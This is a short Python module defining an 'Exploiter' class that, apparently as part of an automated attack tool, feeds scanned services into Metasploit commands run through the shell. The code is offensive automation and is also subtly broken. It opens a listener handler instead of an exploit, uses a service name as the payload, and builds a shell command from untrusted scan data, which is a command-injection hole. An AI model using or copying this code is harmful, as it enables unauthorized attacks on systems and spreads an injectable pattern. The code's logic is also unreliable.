import subprocess
import logging
import yaml  # Import the yaml library

class Exploiter:
    def __init__(self, vulnerabilities):
        self.vulnerabilities = vulnerabilities
        with open('config.yaml', 'r') as config_file:  # Load config.yaml
            self.config = yaml.safe_load(config_file)  # Store config as an instance variable

    def exploit(self):
        if self.config['default']['metasploit_enabled']:  # Use instance variable
            print("Attempting exploitation with Metasploit...")
            for port, service_info in self.vulnerabilities.items():
                try:
                    exploit_command = f"msfconsole -x 'use exploit/multi/handler; set payload {service_info['service']}; run'"
                    subprocess.run(exploit_command, shell=True, check=True)
                except subprocess.CalledProcessError as e:
                    logging.error("Failed to exploit service on port %s: %s", port, e)
        else:
            print("Metasploit is disabled in config.")
        return self.vulnerabilities
